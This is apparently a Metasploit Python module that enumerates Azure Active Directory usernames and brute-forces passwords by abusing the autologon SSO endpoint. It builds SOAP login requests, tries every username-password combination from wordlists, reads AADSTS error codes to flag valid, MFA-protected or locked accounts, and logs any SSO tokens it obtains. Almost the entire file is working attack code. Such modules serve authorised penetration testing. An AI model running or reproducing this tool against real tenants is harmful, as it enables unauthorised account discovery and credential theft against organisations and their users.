#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# standard modules
from metasploit import module

# extra modules
DEPENDENCIES_MISSING = False
try:
    import datetime
    import itertools
    import os
    import requests
    import uuid
    import xml.etree.ElementTree as ET
    from xml.sax.saxutils import escape
except ImportError:
    DEPENDENCIES_MISSING = True


# Metasploit Metadata
metadata = {
    'name': 'Microsoft Azure Active Directory Login Enumeration',
    'description': '''
        Enumerate valid usernames and passwords against a Microsoft Azure Active Directory
        domain by utilizing a flaw in how SSO authenticates.
    ''',
    'authors': [
        'Matthew Dunn'
    ],
    'date': '2021-10-06',
    'license': 'MSF_LICENSE',
    'references': [
        {'type': 'url', 'ref': 'https://arstechnica.com/information-technology/2021/09/new-azure-active-directory-password-brute-forcing-flaw-has-no-fix/'},
        {'type': 'url', 'ref': 'https://github.com/treebuilder/aad-sso-enum-brute-spray'},
    ],
    'type': 'single_scanner',
    'options': {
        'RHOSTS': {'type': 'string',
                      'description': 'The Azure Autologon endpoint',
                      'required': True, 'default': 'autologon.microsoftazuread-sso.com'},
        'targeturi': {'type': 'string',
                      'description': 'The base path to the Azure autologon endpoint',
                      'required': True, 'default': '/winauth/trust/2005/usernamemixed'},
        'rport': {'type': 'port', 'description': 'Port to target',
                  'required': True, 'default': 443},
        'domain': {'type': 'string', 'description': 'The target Azure AD domain',
                   'required': True, 'default': None},
        'username': {'type': 'string',
                     'description': 'The username to verify or path to a file of usernames',
                     'required': True, 'default': None},
        'password': {'type': 'string',
                     'description': 'The password to try or path to a file of passwords',
                     'required': True, 'default': None},
    }
}


def check_login(rhost, rport, domain, targeturi, username, password):
    """Check a single login against the Azure Active Directory Domain"""

    request_id = uuid.uuid4()
    url = 'https://autologon.microsoftazuread-sso.com:{}/{}{}?client-request-id={}'.format(rport, domain, targeturi, request_id)

    created = str(datetime.datetime.now())
    expires = str(datetime.datetime.now() + datetime.timedelta(minutes=10))

    message_id = uuid.uuid4()
    username_token = uuid.uuid4()

    body = """<?xml version='1.0' encoding='UTF-8'?>
<s:Envelope xmlns:s='http://www.w3.org/2003/05/soap-envelope' xmlns:wsse='http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd' xmlns:saml='urn:oasis:names:tc:SAML:1.0:assertion' xmlns:wsp='http://schemas.xmlsoap.org/ws/2004/09/policy' xmlns:wsu='http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd' xmlns:wsa='http://www.w3.org/2005/08/addressing' xmlns:wssc='http://schemas.xmlsoap.org/ws/2005/02/sc' xmlns:wst='http://schemas.xmlsoap.org/ws/2005/02/trust' xmlns:ic='http://schemas.xmlsoap.org/ws/2005/05/identity'>
    <s:Header>
        <wsa:Action s:mustUnderstand='1'>http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue</wsa:Action>
        <wsa:To s:mustUnderstand='1'>{}</wsa:To>
        <wsa:MessageID>urn:uuid:{}</wsa:MessageID>
        <wsse:Security s:mustUnderstand="1">
            <wsu:Timestamp wsu:Id="_0">
                <wsu:Created>{}</wsu:Created>
                <wsu:Expires>{}</wsu:Expires>
            </wsu:Timestamp>
            <wsse:UsernameToken wsu:Id="{}">
                <wsse:Username>{}@{}</wsse:Username>
                <wsse:Password>{}</wsse:Password>
            </wsse:UsernameToken>
        </wsse:Security>
    </s:Header>
    <s:Body>
        <wst:RequestSecurityToken Id='RST0'>
            <wst:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</wst:RequestType>
                <wsp:AppliesTo>
                    <wsa:EndpointReference>
                        <wsa:Address>urn:federation:MicrosoftOnline</wsa:Address>
                    </wsa:EndpointReference>
                </wsp:AppliesTo>
                <wst:KeyType>http://schemas.xmlsoap.org/ws/2005/05/identity/NoProofKey</wst:KeyType>
        </wst:RequestSecurityToken>
    </s:Body>
</s:Envelope>
"""
    body = body.format(url, message_id, created, expires, username_token,
                       escape(username), escape(domain), escape(password))
    session = requests.Session()
    report_data = {'address': 'autologon.microsoftazuread-sso.com', 'domain':domain, 'port': rport,
                   'protocol': 'tcp', 'service_name':'Azure AD'}
    try:
        request = session.post(url, data=body, timeout=30)
        # Parse the XML
        root_xml = ET.fromstring(request.content)
        ns0 = '{http://www.w3.org/2003/05/soap-envelope}'
        ns1 = '{http://schemas.microsoft.com/Passport/SoapServices/SOAPFault}'
        ns2 = '{http://schemas.xmlsoap.org/ws/2005/02/trust}'
        ns3 = '{urn:oasis:names:tc:SAML:1.0:assertion}'
        if b'DesktopSsoToken' in request.content:
            auth_details = root_xml.find('{}Body/{}RequestSecurityTokenResponse/{}RequestedSecurityToken/{}Assertion/DesktopSsoToken'.format(ns0, ns2, ns2, ns3)).text
        else:
            auth_details = root_xml.find('{}Body/{}Fault/{}Detail/{}error/{}internalerror/{}text'.format(ns0,ns0,ns0,ns1,ns1,ns1)).text

        # Based on the auth details, we determine whether the username/password pair is valid
        if b'DesktopSsoToken' in request.content: # We get a correct response
            module.log('Login {}\\{}:{} is valid!'.format(domain, username, password), level='good')
            module.log('Desktop SSO Token: {}'.format(auth_details), level='good')
            module.report_correct_password(username, password, **report_data)
        elif auth_details.startswith("AADSTS50126"): # Valid user but incorrect password
            module.log('Password {} is invalid but {}\\{} is valid!'.format(password, domain, username),
                       level='good')
            module.report_valid_username(username, **report_data)
        elif auth_details.startswith("AADSTS50056"): # User exists without a password in Azure AD
            module.log('{}\\{} is valid but the user does not have a password in Azure AD!'.format(domain, username),
                       level='good')
            module.report_valid_username(username, **report_data)
        elif auth_details.startswith("AADSTS50076"): # User exists, but you need MFA to connect to this resource
            module.log('Login {}\\{}:{} is valid, but you need MFA to connect to this resource'.format(password, domain, username),
                       level='good')
            module.report_valid_username(username, **report_data)
        elif auth_details.startswith("AADSTS50014"): # User exists, but the maximum Pass-through Authentication time was exceeded
            module.log('{}\\{} is valid but the maximum pass-through authentication time was exceeded'.format(domain, username),
                       level='good')
            module.report_valid_username(username, **report_data)
        elif auth_details.startswith("AADSTS50034"): # User does not exist
            module.log('{}\\{} is not a valid user'.format(domain, username), level='error')
        elif auth_details.startswith("AADSTS50053"): # Account is locked
            module.log('Account is locked, consider taking time before continuuing to scan!',
                       level='error')
            return
        else: # Unknown error code
            module.log('Received unknown response with error code: {}'.format(auth_details))
    except requests.exceptions.Timeout:
        module.log('No response received in 30 seconds, continuuing...', level='error')
    except requests.exceptions.RequestException as exc:
        module.log('{}'.format(exc), level='error')
        return


def check_logins(rhost, rport, targeturi, domain, usernames, passwords):
    """Check each username and password combination"""
    for (username, password) in list(itertools.product(usernames, passwords)):
        check_login(rhost, rport, targeturi, domain, username.strip(), password.strip())


def run(args):
    """Run the module, verifying usernames and passwords"""
    module.LogHandler.setup(msg_prefix='{} - '.format(args['rhost']))
    if DEPENDENCIES_MISSING:
        module.log('Module dependencies are missing, cannot continue', level='error')
        return

    # Gather usernames and passwords for enumeration
    if os.path.isfile(args['username']):
        with open(args['username'], 'r') as file_contents:
            usernames = file_contents.readlines()
    else:
        usernames = [args['username']]
    if 'password' in args and os.path.isfile(args['password']):
        with open(args['password'], 'r') as file_contents:
            passwords = file_contents.readlines()
    elif 'password' in args and args['password']:
        passwords = [args['password']]
    else:
        passwords = ['wrong']
    # Check each valid login combination
    check_logins(args['rhost'], args['rport'], args['domain'], args['targeturi'],
                   usernames, passwords)

if __name__ == '__main__':
    module.run(metadata, run)
